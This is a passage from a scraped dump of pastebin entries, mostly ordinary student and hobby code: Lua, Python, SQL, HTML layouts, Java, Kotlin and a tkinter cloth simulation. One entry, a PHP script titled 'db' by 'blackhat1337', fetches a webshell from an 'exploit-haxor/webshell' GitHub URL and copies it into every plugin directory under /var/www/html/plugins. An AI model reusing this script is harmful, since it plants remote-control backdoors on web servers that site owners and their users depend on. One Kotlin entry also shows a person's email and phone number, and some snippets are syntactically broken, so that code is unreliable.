        term.setBackgroundColor(colors.black)
    end
    return true
end

function nostorage()
	-- relevant error msg
end


function start_loop()
    ok,side=findSide ()
    if not ok then
        nostorage()
    end
    bats = peripheral.getNames()
    while true do
        terminal_screen()
		ping_home()
        if #bats >2 then
            print(""Only one device is supported"")
            break
        elseif  #bats == 2 then
            for batNo,bat in pairs(bats) do
                if bat~=side then
                    ok = getBat(bat,bat)
                end
            end
        else
            ok = getBat(side,""Battery""..os.getComputerID())
        end
        if not ok then
            print(""No power storage found"")
            print(""Do you have the right module?"")
            print(""remove all file except install to reset"")
            break
        end
        sleep(30)
    end
end

function start()
    term.clear()
    term.setCursorPos(1,1)

    if fs.exists(""config.txt"") then
        load_config()
        start_loop()
    else
        run_installer()
    end
end

start()"
Xn6R1wd9,Counting Numbers,BinYamin,Python,Wednesday 27th of March 2024 02:51:40 AM CDT,"## simple program to convert any number from digits to english spellings
## Works for 0 to billion-1
#TODO add argparse

def toWords(num):
	#Converts numbers from 0 to 999 to words
	#
	#

	op = """"
	if num > 999 or num < 0:
		op += ""invalid""
		return 
	if num == 0:
		op = numbers[0]
		return

	numbers = ['zero', 'one', 'two', 'three', 'four', 'five', 'six', 'seven', 'eight', 'nine']
	teens = ['ten', 'eleven', 'twelve', 'thirteen', 'fourteen', 'fifteen', 'sixteen', 'seventeen', 'eighteen', 'nineteen']
	tens = [ '', 'ten', 'twenty', 'thirty', 'forty', 'fifty', 'sixty', 'seventy', 'eighty', 'ninty', 'hundred' ]
	powers = ['hundred', 'thousand', 'million']

	szNum = ""%03d"" % num	
	if int(szNum[0]) != 0:		#Dxx
		op = numbers[int(szNum[0])] + "" "" + powers[0]

	if (szNum[0]!='0') & (szNum[1:3] != '00'):
		op += "" and""

	if int(szNum[1]) == 1:		#1D
		if op != """":
			op += "" ""
		op = op + teens[int(szNum[1:3])-10]
		return op

	elif szNum[1] != '0':		#Dx
		if op != """":
			op += "" ""
		op = op + tens[int(szNum[1])]
	if szNum[2] != '0': 		#xD
		if op != """":
			op += "" ""
		op += numbers[int(szNum[2])]
	return op


def getNumber(num):
	#converts numbers from 0 to 999,999,999 (ie 1billion-1)
	# to words.
	# useds toWords() to spell out chunks of 3 digit nums.

	powers = ['hundred', 'thousand', 'million']
	if num > 999999999:
		return ""number too big""

	lower = num%1000
	thous = num//1000
	mills = thous//1000
	thous = thous%1000

	fo = """"
	if mills != 0:
		fo += toWords(mills) + "" "" + powers[2]
	
	if thous != 0:
		if fo != """":
			fo += "" ""
		fo += toWords(thous) + "" "" + powers[1]

	if lower != 0:
		if fo != """":
			fo += "" ""
		fo += toWords(lower)
	if num == 0:
		fo = ""zero""
	return fo


for i in range(0,1999999, 91):
	print( str(i) + "": "" + getNumber(i))
"
bNnCSWML,db,blackhat1337,PHP,Wednesday 27th of March 2024 02:18:48 AM CDT,"<?php
error_reporting(0);

$root = '/var/www/html/plugins';
$scan = scandir($root);

$nama = 'db-cyber.php'; // ganti nama file
$isi = file_get_contents('https://raw.githubusercontent.com/exploit-haxor/webshell/main/mydb%40.php'); // ganti link pastebin scriptmu

$bikin = fopen($nama, ""w"");
		 fwrite($bikin, $isi);
		 fclose($bikin);

foreach ( $scan as $a ) {
	$dir = ""$a \n"";
	$gas = $root.'/'.$a.'/web/'.$nama;
	$cos = ""$gas \n"";
	$asu = @copy($nama, $gas);
	if($asu) {
		print 'Done! => '.$cos; }
			else { print 'Failed! => '.$dir; }
	}
?>"
H0erRZtN,Untitled,ma39isy,Oracle 11,Wednesday 27th of March 2024 01:53:52 AM CDT,"SELECT
	LECTURERCODE,
	NIP,
	EMPLOYEESNAME,
	TIPEDOSEN,
	ACADEMICGRADESID,
	SALARY,
	ROUND(NVL(SKS,
	0),
	2) SKS,
	ROUND(NVL(SKS_KOOR,
	0),
	2) SKS_KOOR,
	ROUND(NVL(SKS,
	0)+ NVL(SKS_KOOR,
	0),
	2) TOTALSKS
FROM
	LECTURERVIEW
JOIN (
	SELECT
		LECTURERCODE,
		SUM(SKS) SKS
	FROM
		(
		SELECT
			LECTURERCODE,
			SUM(CREDIT_MAIN_LECTURECODE) SKS
		FROM
			COURSE
		JOIN SUBJECTS
				USING (SUBJECTID)
		WHERE
			ACTIVATEDSTATUS = 'YA'
			AND LECTURERCODE IS NOT NULL
			AND SCHOOLYEAR = '2324'
			AND SEMESTER = '2'
		GROUP BY
			LECTURERCODE
	UNION ALL
		SELECT
			A.LECTURERCODE,
			SUM(A.CREDIT) SKS
		FROM
			COURSE_TEACHING_TEAM A
		JOIN COURSE
				USING (COURSEID)
		JOIN SUBJECTS
				USING (SUBJECTID)
		WHERE
			ACTIVATEDSTATUS = 'YA'
			AND A.LECTURERCODE IS NOT NULL
			AND SCHOOLYEAR = '2324'
			AND SEMESTER = '2'
		GROUP BY
			A.LECTURERCODE
                    )
	GROUP BY
		LECTURERCODE)
		USING (LECTURERCODE)
LEFT JOIN (
	SELECT
		COURSECOORDINATOR,
		COUNT(DISTINCT SUBJECTID) SKS_KOOR
	FROM
		COURSE
	JOIN SUBJECTS
			USING (SUBJECTID)
	WHERE
		ACTIVATEDSTATUS = 'YA'
		AND COURSECOORDINATOR IS NOT NULL
		AND SCHOOLYEAR = '2324'
		AND SEMESTER = '2'
	GROUP BY
		COURSECOORDINATOR) ON
	(COURSECOORDINATOR = LECTURERCODE)
ORDER BY
	NIP ASC"
pc4mJuS9,Layout A,SenpaiZero,HTML,Wednesday 27th of March 2024 01:53:42 AM CDT,"
<!DOCTYPE html>
<html>
    <head>
        <title></title>
        <link href=""https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css"" rel=""stylesheet"" integrity=""sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH"" crossorigin=""anonymous"">
        <script src=""https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"" integrity=""sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz"" crossorigin=""anonymous""></script>
        <style>
            * {
                color: rgb(68, 68, 68);
            }
            body {
                background-color: sandybrown;
            }

            .custom-navbar-bg {
                background-color: rgb(255, 188, 130);
            }

            .footer {
                margin-top: 30px;
                background-color: rgb(255, 153, 63);
            }

            .header {
                background-color: rgb(255, 153, 63);
            }

            .image {
                margin-top: 20px;
                width: 256px;
                height: 256px;
                border: 4px solid rgb(200, 113, 113);
                border-radius: 8px;
                object-fit: cover;
            }
        </style>
    </head>
    <body>
        <!--Header-->
        <header class=""text-center header"">
            <h1>MADE FOR LAYOUT A</h1>
        </header>
        <!--Navigation-->
        <nav class=""navbar navbar-expand-lg custom-navbar-bg"" >
            <div class=""container-fluid"">
              <a class=""navbar-brand"" href=""#"">04 Activity 1</a>
              <button class=""navbar-toggler"" type=""button"" data-bs-toggle=""collapse"" data-bs-target=""#navbarSupportedContent"" aria-controls=""navbarSupportedContent"" aria-expanded=""false"" aria-label=""Toggle navigation"">
                <span class=""navbar-toggler-icon""></span>
              </button>
              <div class=""collapse navbar-collapse"" id=""navbarSupportedContent"">
                <ul class=""navbar-nav me-auto mb-2 mb-lg-0"">
                  <li class=""nav-item"">
                    <a class=""nav-link active"" aria-current=""page"" href=""#"">Home</a>
                  </li>
                  <li class=""nav-item"">
                    <a class=""nav-link"" href=""#"">About</a>
                  </li>
                  <li class=""nav-item"">
                    <a class=""nav-link"" href=""#"">Store</a>
                  </li>
                  <li class=""nav-item"">
                    <a class=""nav-link"" href=""#"">More articles</a>
                  </li>
                </ul>
              </div>
            </div>
          </nav>

        <!--Section/Article-->
        <div class=""container text-center"">
            <div class=""row text-center fs-1"">
                <div class=""col"">
                    How artificial intelligence is transforming the world
                </div>
            </div>
            <div class=""row"">
              <section class=""col"">
                The potential of Artificial Intelligence (AI) and robots to reshape our future has attracted vast interest among 
                the public, government and academia in the last few years. As in every other sector of life, higher education 
                (HE) will be affected, perhaps in a profound way (Bates et al., 2020; DeMartini and Benussi, 2017). HE will have 
                to adapt to educate people to operate in a new economy and potentially for a different way of life. AI and robotics 
                are also likely to change how education itself works, altering what learning is like, the role of teachers.
                <br><img class=""image"" src=""https://sdtimes.com/wp-content/uploads/2016/06/0622.sdt-openai.jpeg"" class=""img-fluid rounded mx-auto d-block"">
              </section>
              <section class=""col"">
                Artificial intelligence algorithms are designed to make decisions, often using real-time data. They are unlike 
                passive machines that are capable only of mechanical or predetermined responses. Using sensors, digital data, 
                or remote inputs, they combine information from a variety of different sources, analyze the material instantly, 
                and act on the insights derived from those data. With massive improvements in storage systems, processing speeds, 
                and analytic techniques, they are capable of tremendous sophistication in analysis and decisionmaking.
                <br><img class=""image"" src=""https://imageio.forbes.com/specials-images/imageserve/5eda41e0b6ac5c00060e2821/Network-forming-AI-robot-face/960x0.jpg"" class=""img-fluid rounded mx-auto d-block"">
              </section>
              <section class=""col"">
                AI has received increased attention from the information systems research community in recent years. 
                There is a growing concern that research on AI could experience a lack of cumulative building 
                of knowledge, which has overshadowed IS research previously. The search strategy resulted in 
                1877 studies, of which 98 were identified as primary studies and a synthesise of key themes that are pertinent 
                to this study is presented. This study makes important contributions, namely an identification 
                of the current reported business value and contributions of AI.
                <br><img class=""image"" src=""https://apacsagepub-perspectivesblog.com/wp-content/uploads/2023/03/Academic-Publishers-and-the-Challenges-of-AI.png"" class=""img-fluid rounded mx-auto d-block"">
              </section>
            </div>
          </div>

          <!--Footer-->
          <footer class=""card text-center footer"">
            <div class=""card-title"">
            </div>
            <div class=""card-text"" style=""margin-bottom: 50px;"">
                SANTOS, YGI MARTIN B. <br>
                BSIT 3A
            </div>
          </footer>
    </body>
</html>"
4ntBXtxz,Layout B,SenpaiZero,HTML,Wednesday 27th of March 2024 01:52:49 AM CDT,"
<!DOCTYPE html>
<html>
    <head>
        <title></title>
        <link href=""https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css"" rel=""stylesheet"" integrity=""sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH"" crossorigin=""anonymous"">
        <script src=""https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"" integrity=""sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz"" crossorigin=""anonymous""></script>
        <style>
            * {
                color: rgb(68, 68, 68);
            }
            body {
                background-color: sandybrown;
            }

            .custom-navbar-bg {
                background-color: rgb(82, 82, 82);
            }

            .custom-navbar-txt-color {
                color: aliceblue;
            }
            .footer {
                padding-top: 30px;
                background-color: rgb(255, 153, 63);
            }

            .header {
                background-color: rgb(255, 153, 63);
            }

            .image {
                margin-top: 20px;
                width: 256px;
                height: 256px;
                border: 4px solid rgb(200, 113, 113);
                border-radius: 8px;
                object-fit: cover;
            }
            
        </style>
    </head>
    <body>
        <!--Navigation-->
        <div class=""container-fluid"">
            <div class=""row flex-nowrap"">
                <div class=""col-auto col-md-3 col-xl-2 px-sm-2 px-0 custom-navbar-bg"">
                    <div class=""d-flex flex-column align-items-center align-items-sm-start px-3 pt-2 text-white min-vh-100"">
                        <a class=""d-flex align-items-center pb-3 mb-md-0 me-md-auto text-white text-decoration-none"">
                            <span class=""fs-5 d-none d-sm-inline custom-navbar-txt-color"">04 Activity 1</span>
                        </a>
                        <ul class=""nav nav-pills flex-column mb-sm-auto mb-0 align-items-center align-items-sm-start"" id=""menu"">
                            <li class=""nav-item"">
                                <a href=""#"" class=""nav-link align-middle px-0"">
                                    <i class=""fs-4 bi-house""></i> <span class=""ms-1 d-none d-sm-inline custom-navbar-txt-color"">Home</span>
                                </a>
                            </li>
                            <li>
                                <a href=""#"" class=""nav-link px-0 align-middle"">
                                    <i class=""fs-4 bi-table""></i> <span class=""ms-1 d-none d-sm-inline custom-navbar-txt-color"">About</span></a>
                            </li>
                            <li>
                                <a href=""#"" class=""nav-link px-0 align-middle"">
                                    <i class=""fs-4 bi-people""></i> <span class=""ms-1 d-none d-sm-inline custom-navbar-txt-color"">Store</span> </a>
                            </li>
                            <li>
                                <a href=""#"" class=""nav-link px-0 align-middle"">
                                    <i class=""fs-4 bi-people""></i> <span class=""ms-1 d-none d-sm-inline custom-navbar-txt-color"">More Articles</span> </a>
                            </li>
                        </ul>
                        <hr>
                    </div>
                </div>
                <!--Header-->
                <div class=""col py-3"">
                    <header class=""text-center header"">
                        <h1>MADE FOR LAYOUT B</h1>
                    </header>
        <!--Section/Article-->
        <div class=""container text-center"">
            <div class=""row text-center fs-1"">
                <div class=""col"">
                    How artificial intelligence is transforming the world
                </div>
            </div>
            <div class=""row"">
              <section class=""col"">
                The potential of Artificial Intelligence (AI) and robots to reshape our future has attracted vast interest among 
                the public, government and academia in the last few years. As in every other sector of life, higher education 
                (HE) will be affected, perhaps in a profound way (Bates et al., 2020; DeMartini and Benussi, 2017). HE will have 
                to adapt to educate people to operate in a new economy and potentially for a different way of life. AI and robotics 
                are also likely to change how education itself works, altering what learning is like, the role of teachers.
                <br><img class=""image"" src=""https://sdtimes.com/wp-content/uploads/2016/06/0622.sdt-openai.jpeg"" class=""img-fluid rounded mx-auto d-block"">
              </section>
              <section class=""col"">
                Artificial intelligence algorithms are designed to make decisions, often using real-time data. They are unlike 
                passive machines that are capable only of mechanical or predetermined responses. Using sensors, digital data, 
                or remote inputs, they combine information from a variety of different sources, analyze the material instantly, 
                and act on the insights derived from those data. With massive improvements in storage systems, processing speeds, 
                and analytic techniques, they are capable of tremendous sophistication in analysis and decisionmaking.
                <br><img class=""image"" src=""https://imageio.forbes.com/specials-images/imageserve/5eda41e0b6ac5c00060e2821/Network-forming-AI-robot-face/960x0.jpg"" class=""img-fluid rounded mx-auto d-block"">
              </section>
            </div>
          </div>
          <!--Footer-->
          <div class=""container"">
            <footer class=""d-flex flex-wrap justify-content-between align-items-center py-3 my-4 border-top"">
              <p class=""col-md-4 mb-0 text-body-secondary"">Santos, Ygi Martin <br>BSIT 3A</p>
          
              <a href=""/"" class=""col-md-4 d-flex align-items-center justify-content-center mb-3 mb-md-0 me-md-auto link-body-emphasis text-decoration-none"">
                <svg class=""bi me-2"" width=""40"" height=""32""><use xlink:href=""#bootstrap""/></svg>
              </a>
          
              <ul class=""nav col-md-4 justify-content-end"">
                <li class=""nav-item""><a href=""#"" class=""nav-link px-2 text-body-secondary"">Home</a></li>
                <li class=""nav-item""><a href=""#"" class=""nav-link px-2 text-body-secondary"">Features</a></li>
                <li class=""nav-item""><a href=""#"" class=""nav-link px-2 text-body-secondary"">Pricing</a></li>
                <li class=""nav-item""><a href=""#"" class=""nav-link px-2 text-body-secondary"">FAQs</a></li>
                <li class=""nav-item""><a href=""#"" class=""nav-link px-2 text-body-secondary"">About</a></li>
              </ul>
            </footer>
          </div>
        </div>
            </div>
        </div>

          
    </body>
</html>"
hLvcDwrg,Podium Top 3 Status,Sungmingamerpro13,CSS,Wednesday 27th of March 2024 12:52:22 AM CDT,"local DataStoreService = game:GetService('DataStoreService')

local WinsDataStore = DataStoreService:GetDataStore('Wins')

script.Parent.UserId:GetPropertyChangedSignal('Value'):Connect(function()
	local PlayerName = game.Players:GetNameFromUserIdAsync(script.Parent.UserId.Value)
	local Player = game.Players:GetPlayerByUserId(script.Parent.UserId.Value)
	script.Parent.Podium.MiddleBlock.SurfaceGui.PlayerName.Text = PlayerName
	script.Parent.Podium.MiddleBlock.SurfaceGui.WinsAmount.Text = Player.leaderstats.Wins.Value
end)
"
Ya20xsGU,Untitled,haikid,Java,Tuesday 26th of March 2024 11:24:30 PM CDT,"import java.util.*; 

class PostFix {
    public LinkedList<String> inFix;
    public LinkedList<String> postFix;
    
    public static void main(String[] args) {
        PostFix test = new PostFix();
        test.inFix = new LinkedList<String>();
    	test.inFix.add(""2.1"");
    	test.inFix.add(""/"");
    	test.inFix.add(""3.2"");
    	test.inFix.add(""-"");
    	test.inFix.add(""("");
    	test.inFix.add(""6.3"");
    	test.inFix.add(""-"");
    	test.inFix.add(""4.2"");
    	test.inFix.add("")"");
    	
    	// === For testing ===
    	//while (!test.inFix.isEmpty()) System.out.print(test.inFix.remove());
    	
        test.inFixToPostFix();
        
        // === For testing ===
    	//while (!test.postFix.isEmpty()) System.out.print(test.postFix.remove() + "" "");
    }
    
    public static boolean isoperator(String arg) {
        return arg.equals(""+"") || arg.equals(""-"") || arg.equals(""*"") || arg.equals(""/"") || arg.equals(""("") || arg.equals("")"");
    }
    
    public void inFixToPostFix() {
    	if (inFix == null)
    		return;
    
    	// create ranking
    	HashMap<String, Integer> rank = new HashMap<String, Integer>();
    	rank.put(""*"", 2);
    	rank.put(""/"", 2);
    	rank.put(""+"", 1);
    	rank.put(""-"", 1);
    
    	postFix = new LinkedList<String>();
    	LinkedList<String> operatorStack = new LinkedList<String>();
    
    	while (!inFix.isEmpty()) {
    		String curr = inFix.remove();
            
    		if (!isoperator(curr)) 
    		{
    			postFix.add(curr);
    		} else if (curr.equals(""("")) {
    			operatorStack.push(curr);
    		} else if (curr.equals("")"")) {
    			while (!operatorStack.peek().equals(""("")) {
    				postFix.add(operatorStack.pop());
    			}
    			operatorStack.remove(); // remove ""(""
    		} else { // it's an operator +,-,*,/
    			int currRank = rank.get(curr);
    
    			if (!operatorStack.isEmpty() && !operatorStack.peek().equals(""("") && rank.get(operatorStack.peek()) >= currRank) {
    				while (!operatorStack.isEmpty() && rank.get(operatorStack.peek()) >= currRank) {
    					postFix.add(operatorStack.pop());
    				}
    			}
    			operatorStack.add(curr);
    		}
    	}
    
    	while (!operatorStack.isEmpty()) {
    		postFix.add(operatorStack.pop());
    	}
    } 
}"
bJF4vZ8A,Untitled,buigianggsa,JavaScript,Tuesday 26th of March 2024 11:11:36 PM CDT,"function calculate(a, b) {
    // Hardcoded values for operation types
    const operationTypes = ['add', 'subtract', 'multiply', 'divide'];

    // Check if operation type is valid
    const isValidOperation = (operation) => {
        return operationTypes.includes(operation);
    };

    // Default operation type
    let operationType = 'add';

    // Perform calculation based on operation type
    switch (operationType) {
        case 'add':
            return a + b;
        case 'subtract':
            return a - b;
        case 'multiply':
            return a * b;
        case 'divide':
            if (b !== 0) {
                return a / b;
            } else {
                return 'Cannot divide by zero';
            }
        default:
            return 'Invalid operation';
    }
}"
dMk0k71N,TUGAS 3 PPB F,Samuel_Berkat_Hulu,Java,Tuesday 26th of March 2024 10:55:04 PM CDT,"package com.example.tugas3ppbf

import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.padding
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.tooling.preview.Preview
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.example.tugas3ppbf.ui.theme.HappyBirthdayTheme

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            HappyBirthdayTheme {
                // A surface container using the 'background' color from the theme 
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    GreetingText(
                        message = ""Happy Birthday BRO!"",
                        from = ""From Samuel"",
                        modifier = Modifier.padding(8.dp)
                    )
                }
            }
        }
    }
}

@Composable
fun GreetingText(message: String, from: String, modifier: Modifier) {
    Column(
        verticalArrangement = Arrangement.Center,
        modifier = modifier
    ) {
        Text(
            text = message,
            fontSize = 100.sp,
            lineHeight = 116.sp,
            textAlign = TextAlign.Center
        )

        Text(
            text = from,
            fontSize = 36.sp,
            modifier = Modifier
                .padding(16.dp)
                .align(alignment = Alignment.End)
        )
    }
}

@Preview(showBackground = true)
@Composable
fun BirthdayCardPreview() {
    HappyBirthdayTheme {
        GreetingText(message = ""Happy Birthday BRO!"", from = ""From Samuel"", modifier = Modifier)
    }
}
"
UqMrD2xZ,XiuBrowser,FreedTV,JSON,Tuesday 26th of March 2024 10:52:54 PM CDT,"{
  ""versionCode"": 1000,
  ""versionName"": ""1.0.0"",
  ""title"": ""Êñ∞ÁâàÊù•‰∫Üv1.0.0"",
  ""desc"": ""‰ºòÂåñ"",
  ""cancel"": ""ÂèñÊ∂à"",
  ""confirm"": ""Á°ÆÂÆö"",
  ""canCancel"": true,
  ""app"": false,
  ""url"": """",
  ""t"": """",
  ""showAd"": true,
  ""showReadAd"": false,
  ""cateList"": [
    {
      ""title"": ""Áà±Áúã"",
      ""pic"": ""https://v.ikanbot.com/resources/logo.svg"",
      ""url"": ""https://v.ikanbot.com/"",
      ""app"": true,
      ""type"": ""web""
    },
    {
      ""title"": ""Êñ∞6V"",
      ""pic"": ""https://img.alicdn.com/imgextra/i2/913168420/O1CN019y7NcV2C4PmY9SqJY_!!913168420.png"",
      ""url"": ""https://www.66s6.net/"",
      ""app"": true,
      ""type"": ""web""
    }
  ]
}"
5zP6jFdp,Other Article Categories,TheiPhoneFan,HTML,Tuesday 26th of March 2024 10:39:15 PM CDT,"    <div class=""tab"">
        <!-- Tab Buttons -->
        <button class=""tablinks"" onclick=""openContent(event, 'Web Development')"" style=""height:60px"">Web Development</button>
        <button class=""tablinks"" onclick=""openContent(event, 'Design')"">Design</button>
        <button class=""tablinks"" onclick=""openContent(event, 'Technology')"">Technology</button>
        <button class=""tablinks"" onclick=""openContent(event, 'Tutorials')"">Tutorials</button>
        <button class=""tablinks"" onclick=""openContent(event, 'Newsletters')"">Newsletters</button>
    </div>

    <!-- Web Development
    Tab 1 -->
    <div id=""Web Development"" class=""tabcontent"">
        <p>No articles under this category have been published yet.</p>
    </div>

    <!-- Deisgn
    Tab 2 -->
    <div id=""Design"" class=""tabcontent"">
        <h2>2024</h2>
        <h3>February 2024</h3>
    </div>"
BMwTK9Eb,TUGAS 2 PPB F,Samuel_Berkat_Hulu,Java,Tuesday 26th of March 2024 10:10:42 PM CDT,"package com.example.tugasppb2
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.*
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import com.example.tugasppb2.ui.theme.TugasPPB2Theme

data class Profile(
  val name: String,
  val email: String,
  val phone: String,
	val hobby : String,
  val skills: List,
)

val profile = Profile(
  name = ""Samuel Berkat Hulu"",
  email = ""samuelberkahulu@gmail.com"",
  phone = ""082189767651""
	hobby = ""Volly""
  skills = listOf(""Python"", ""SQL"", ""C++"")
)

class MainActivity : ComponentActivity() {
  override fun onCreate(savedInstanceState: Bundle?) {
    super.onCreate(savedInstanceState)
    setContent {
      TugasPPB2Theme {
        Surface(
          modifier = Modifier.fillMaxSize(),
          color = MaterialTheme.colorScheme.background
        ) {
          ProfileSection(profile)
          HeaderSection()
        }
      }
    }
  }
}

@Composable
fun HeaderSection(){
  Text(
    text = ""Hello World"",
    style = MaterialTheme.typography.headlineMedium,
    textAlign = TextAlign.Center,
    modifier = Modifier.padding(8.dp)
  )
}

@Composable
fun ProfileSection(profile: Profile) {
  Column(
    modifier = Modifier.fillMaxSize(),
    verticalArrangement = Arrangement.Center,
    horizontalAlignment = Alignment.CenterHorizontally
  ) {
    Text(
      text = ""Name: "" + profile.name,
      style = MaterialTheme.typography.bodyMedium,
      modifier = Modifier.padding(8.dp)
    )
    Text(
      text = ""Email: "" + profile.email,
      style = MaterialTheme.typography.bodyMedium,
      modifier = Modifier.padding(8.dp)
    )
    Text(
      text = ""Phone: "" + profile.phone,
      style = MaterialTheme.typography.bodyMedium,
      modifier = Modifier.padding(8.dp)
    )
    Text(
      text = ""Skills: "" + profile.skills.joinToString("", ""),
      style = MaterialTheme.typography.bodyMedium,
      modifier = Modifier.padding(8.dp)
    )
		Text(
      text = ""hobby : "" + profile.hobby,
      style = MaterialTheme.typography.bodyMedium,
      modifier = Modifier.padding(8.dp).
  }
}"
JXmpqUvn,Image Gallery Without Expandable Images,TheiPhoneFan,HTML,Tuesday 26th of March 2024 10:02:06 PM CDT,"<!-- Created by TheiPhoneFan on 2024-03-26 -->
<!-- Previews 6.0.3, 2022-2024 -->
<!DOCTYPE html>
<html>

<head>
    <link href=""https://fonts.googleapis.com/css?family=Roboto:400,300,100,700,900"" rel=""stylesheet"" type=""text/css"">
    <link rel=""stylesheet"" href=""./theme/style.css"" />
    <style>
        div.gallery {
            border: 1px solid #ccc;
			border-radius: 16px;
        }

        div.gallery:hover {
            border: 1px solid #777;
        }

        div.gallery img {
            width: 100%;
            height: auto;
			border-radius: 16px 16px 0px 0px;
        }

        div.desc {
            padding: 15px;
            text-align: center;
		   font-family: 'Roboto', sans-serif;
        }

        * {
            box-sizing: border-box;
        }

        .responsive {
            padding: 0 6px;
            float: left;
            width: 24.99999%;
        }

        @media only screen and (max-width: 700px) {
            .responsive {
                width: 49.99999%;
                margin: 6px 0;
            }
        }

        @media only screen and (max-width: 500px) {
            .responsive {
                width: 100%;
            }
        }

        .clearfix:after {
            content: """";
            display: table;
            clear: both;
        }
    </style>
</head>

<body>
    <div class=""responsive"">
        <div class=""gallery"">
            <a target=""_blank"" href=""https://www.w3schools.com/css/img_5terre.jpg"">
                <img src=""https://www.w3schools.com/css/img_5terre.jpg"" alt=""Cinque Terre"" width=""600"" height=""400"">
            </a>
            <div class=""desc"">Add a description of the image here</div>
        </div>
    </div>


    <div class=""responsive"">
        <div class=""gallery"">
            <a target=""_blank"" href=""https://www.w3schools.com/css/img_forest.jpg"">
                <img src=""https://www.w3schools.com/css/img_forest.jpg"" alt=""Forest"" width=""600"" height=""400"">
            </a>
            <div class=""desc"">Add a description of the image here</div>
        </div>
    </div>

    <div class=""responsive"">
        <div class=""gallery"">
            <a target=""_blank"" href=""https://www.w3schools.com/css/img_lights.jpg"">
                <img src=""https://www.w3schools.com/css/img_lights.jpg"" alt=""Northern Lights"" width=""600"" height=""400"">
            </a>
            <div class=""desc"">Add a description of the image here</div>
        </div>
    </div>

    <div class=""responsive"">
        <div class=""gallery"">
            <a target=""_blank"" href=""https://www.w3schools.com/css/img_mountains.jpg"">
                <img src=""https://www.w3schools.com/css/img_mountains.jpg"" alt=""Mountains"" width=""600"" height=""400"">
            </a>
            <div class=""desc"">Add a description of the image here</div>
        </div>
    </div>
</body>
</html>"
uXqtCQQF,# tk_cloth_sim.py,here2share,Python,Tuesday 26th of March 2024 09:46:33 PM CDT,"# tk_cloth_sim.py ZZZ

import tkinter as tk

cloth_width = 18
cloth_height = 12
cloth_spacing = 30
cloth_damping = 0.98
gravity = 0.1

ww, hh = 600, 600
root = tk.Tk()
canvas = tk.Canvas(root, width=ww, height=hh)
canvas.pack()

points = []
constraints = []
for y in range(cloth_height + 1):
    for x in range(cloth_width + 1):
        point = {
            'x': x * cloth_spacing,
            'y': y * cloth_spacing + 20,
            'old_x': x * cloth_spacing,
            'old_y': y * cloth_spacing,
            'pinned': (x == 0 and y == 0) or (x == cloth_width and y == 0),
        }
        points.append(point)

    for x in range(cloth_width):
        a = y * (cloth_width + 1) + x
        b = a + 1
        constraints.append({
            'point_a': points[a],
            'point_b': points[b],
            'length': cloth_spacing,
        })

for y in range(cloth_height):
    for x in range(cloth_width + 1):
        a = y * (cloth_width + 1) + x
        b = a + cloth_width + 1
        constraints.append({
            'point_a': points[a],
            'point_b': points[b],
            'length': cloth_spacing,
        })

points[cloth_width]['x'] = ww
points[cloth_width]['pinned'] = True

drag_point = None

def on_mouse_down(event):
	global drag_point
	for point in points:
		if abs(point['x'] - event.x) < cloth_spacing:
			if abs(point['y'] - event.y) < cloth_spacing:
				drag_point = point
				drag_point['xm'] = event.x
				drag_point['ym'] = event.y
				return

def on_mouse_move(event):
    if drag_point:
        drag_point['x'] = drag_point['xm'] = event.x
        drag_point['y'] = drag_point['ym'] = event.y

def on_mouse_up(event):
    global drag_point
    drag_point = None

canvas.bind('<ButtonPress-1>', on_mouse_down)
canvas.bind('<B1-Motion>', on_mouse_move)
canvas.bind('<ButtonRelease-1>', on_mouse_up)

while True:
	for point in points:
		if not point['pinned']:
			velocity_x = (point['x'] - point['old_x']) * cloth_damping
			velocity_y = (point['y'] - point['old_y']) * cloth_damping
			point['old_x'] = point['x']
			point['old_y'] = point['y']
			point['x'] += velocity_x
			point['y'] += velocity_y + gravity

	for constraint in constraints:
		point_a = constraint['point_a']
		point_b = constraint['point_b']
		length = constraint['length']
		dx = point_b['x'] - point_a['x']
		dy = point_b['y'] - point_a['y']
		distance = (dx ** 2 + dy ** 2) ** 0.5
		difference = length - distance
		percentage = difference / distance / 2
		offset_x = dx * percentage
		offset_y = dy * percentage
		if not point_a['pinned']:
			point_a['x'] -= offset_x
			point_a['y'] -= offset_y
		if not point_b['pinned']:
			point_b['x'] += offset_x
			point_b['y'] += offset_y
			
	if drag_point:
		drag_point['x'] = drag_point['xm']
		drag_point['y'] = drag_point['ym']

	canvas.delete('cloth')

	for y in range(cloth_height + 1):
		point_coords = [(points[y * (cloth_width + 1) + x]['x'], points[y * (cloth_width + 1) + x]['y']) for x in range(cloth_width + 1)]
		canvas.create_line(point_coords, tags='cloth', fill='black')

	for x in range(cloth_width + 1):
